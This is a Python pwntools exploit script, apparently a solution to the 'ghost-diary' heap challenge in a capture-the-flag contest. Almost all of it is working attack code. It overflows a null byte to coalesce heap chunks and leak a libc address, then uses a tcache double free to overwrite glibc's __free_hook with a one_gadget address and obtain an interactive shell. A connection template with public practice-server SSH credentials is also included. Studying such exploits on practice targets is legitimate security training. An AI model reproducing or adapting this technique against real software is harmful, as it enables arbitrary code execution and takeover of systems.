from pwn import ELF, process, ROP, remote, ssh, gdb, cyclic, cyclic_find, log, p64, u64  # Import pwntools


####################
#### CONNECTION ####
####################
LOCAL = True
REMOTETTCP = False
REMOTESSH = False
GDB = False

LOCAL_BIN = '/problems/ghost-diary_3_ef159a8a880a083c73a2bb724fc0bfcb/ghostdiary'
REMOTE_BIN = '~/vuln' #For ssh
LIBC = ELF('./libc.so.6') # #Set library path when know it

if LOCAL:
    P = process(LOCAL_BIN) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTETTCP:
    P = remote('10.10.10.10',1339) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTESSH:
    ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
    p = ssh_shell.process(REMOTE_BIN) # start the vuln binary
    elf = ELF(LOCAL_BIN)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets

if GDB and not REMOTETTCP and not REMOTESSH:
    # attach gdb and continue
    # You can set breakpoints, for example 'break *main'
    gdb.attach(P.pid,'b free')



##########################
##### FUNCTION ######
##########################

def add(page_size):
	P.sendlineafter(b'> ',b'1')
	if page_size < 0xf1:
		P.sendlineafter(b'> ',b'1')
	else:
		P.sendlineafter(b'> ',b'2')
	P.sendlineafter(b'size: ',str(page_size))
	print('Add 1 page with size ', page_size)

def remove(page_index):
	P.sendlineafter(b'> ',b'4')
	P.sendlineafter(b'Page: ',str(page_index))
	print('Remove page ', page_index)
	
def edit(page_index,payload):
	P.sendlineafter(b'> ',b'2')
	P.sendlineafter(b'Page: ',str(page_index))
	P.sendlineafter(b'Content: ',payload)
	print('Edited page: ', page_index, ' with content: ',str(payload))
	
def listen(page_index):
	P.sendlineafter(b'> ',b'3')
	P.sendlineafter(b'Page: ',str(page_index))
	P.recvuntil(b'Content: ')
	recv = P.recvline()
	print('Page ', page_index, ' content: ',recv)
	return recv

def fillupTcache(size,from_index):
	for i in range(0,7):
		add(size)
	for i in range(0,7):
		remove(i+from_index)

#####################
#### Find Gadgets ###
#####################
#try:
#    libc_func = 'puts'
#    PUTS_PLT = ELF_LOADED.plt['puts'] #PUTS_PLT = ELF_LOADED.symbols['puts'] # This is also valid to call puts
#except:
    #libc_func = 'printf'
    #PUTS_PLT = ELF_LOADED.plt['printf']

#MAIN_PLT = ELF_LOADED.symbols['main']
#POP_RDI = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep 'pop rdi'
#RET = (ROP_LOADED.find_gadget(['ret']))[0]

#log.info('Main start: ' + hex(MAIN_PLT))

ONE_GADGET = [0x4f2c5, 0x4f322, 0x10a38c]
OFFSET = 0x3ebca0


#########################
#### Finf LIBC offset ###
#########################

##############################
##### FINAL EXPLOITATION #####
##############################

add(0x128) #Chunk A
add(0x118) #B
add(0x118) #C

fillupTcache(0xf0,3) 	#fill up 0x100 bin
fillupTcache(0x128,3) 	#fill up 0x130 bin

remove(0)		#free chunk A, pointer to libc will be placed here

payload1 = b'A'*0x110 + p64(0x250) + b'\x00'	#prepare prev_size of chunk C to 0x250 and overflow 1 null byte
edit(1,payload1)

P.sendline(b'200')
#P.clean()

payload2 = b'C'*0xf8 + p64(0x21)	#prepare the left of chunk C size to 0x21 to overcome security check (PREV_IN_USE bit must be turn on)
edit(2,payload2)

remove(2)		#free chunk C, this will cause it to coalesce with 0x250 bytes before, hence we get a pointer to A

for i in range(0,7):
		add(0x120)		# clean Tcache to use unsorted bin, index: 0,2,3,4,5,6,7

add(0x120)				#index: 8, this pointer point to A
#allocate a chunk, so the fd & bk pointer move to the remained chunk, which is also chunk B pointer

libc_leak = u64(listen(1).split(b'\n')[0].ljust(8,b'\x00'))	# Read to get libc pointer

libc_base = libc_leak - OFFSET

libc_free_hook = libc_base + 0x00000000003ed8e8

libc_one_gadget = libc_base + ONE_GADGET[1]

print('Libc_Leak: ', hex(libc_leak))
print('Libc_Base: ', hex(libc_base))

add(0x120)			#index: 9, malloc another chunk to get 2 pointer to B chunk

#now remove 2 B chunk pointer to get it into tcache bin cause we got 2 pointer, we can abuse double free here
remove(9)
remove(1)

add(0x120)	#get the B chunk pointer again

#edit the pointer in tcache bin
edit(1,p64(libc_free_hook))

add(0x120)	#get the other B chunk pointer

add(0x120)	#get the free_hook pointer, index: 9

edit(10, p64(libc_one_gadget)+p64(0)) 	# free_hook now call one gadget

remove(8)	#call free to get shell

P.interactive()




